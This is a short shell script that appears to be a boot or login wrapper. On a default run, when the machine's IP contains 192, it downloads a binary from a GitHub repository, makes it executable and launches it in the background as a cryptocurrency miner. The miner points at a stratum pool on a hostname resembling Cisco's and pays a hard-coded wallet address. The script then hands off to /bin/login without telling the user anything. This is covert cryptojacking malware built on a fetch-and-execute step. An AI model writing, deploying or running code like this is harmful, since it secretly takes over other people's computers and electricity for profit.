#!/bin/sh
#A190320
#R190320

END="cisco.viewdns.net"
PORT="80"
USER="497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg"
TAG="OSRUN-TESTE"

_VERATU(){

if ping google.com -c3 2> /dev/null; then
 echo "conexao ok"
for i in $(seq 2); do
 eval ALOCAL$i=`sed -n $(($i+1))p $0`
 eval ONLINE$i=`wget --no-cache -qO - https://raw.githubusercontent.com/osrun/beta/master/run.sh | sed -n $(($i+1))p`
 if [ $(eval 'echo $ALOCAL'$i) = $(eval echo '$ONLINE'$i) ]; then
   echo "Atualizado"
  else
   echo "Atualizar"
 fi
done
 else
  echo "sem conexao"
fi
}

_APP(){
 case $1 in
   start)  
     #sysctl -w vm.nr_hugepages=128
     wget -c --tries=0 --retry-connrefused --timeout=2 --wait=1 --no-check-cert https://raw.githubusercontent.com/osrun/beta/master/app
     chmod +x app
     ./app -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
   ;; 
 esac
}

#(
#sleep 60
#killall run
#)&

case $1 in
 -v)
    _VERATU
  ;;
  *)
   if ifconfig | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null; then
    _APP start
   fi
   read -p "PRESS [ENTER]" NULL
   setsid cttyhack /bin/login   
;;
esac
